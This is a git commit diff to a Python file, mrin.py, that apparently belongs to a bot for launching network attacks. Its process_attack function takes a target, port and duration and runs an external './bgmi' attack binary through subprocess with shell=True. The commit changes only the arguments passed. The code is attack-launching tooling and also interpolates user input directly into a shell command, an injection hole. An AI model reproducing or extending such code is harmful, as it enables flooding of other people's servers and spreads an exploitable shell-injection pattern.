1feb481eed1b4074244d9edb5a57202d81287141
prmnk123 <nirotamsahu96@gmail.com>
2025-04-08 23:13:49 +0530

    Update mrin.py

--- mrin.py
+++ mrin.py
@@ -84,7 +84,7 @@ def process_attack(message, target, port, time):
     start_attack_reply(message, target, port, time)
     
     # Execute the attack
-    full_command = f"./bgmi {target} {port} {time} 0"
+    full_command = f"./bgmi {target} {port} {time}"
     try:
         subprocess.run(full_command, shell=True, check=True)
     except subprocess.CalledProcessError:
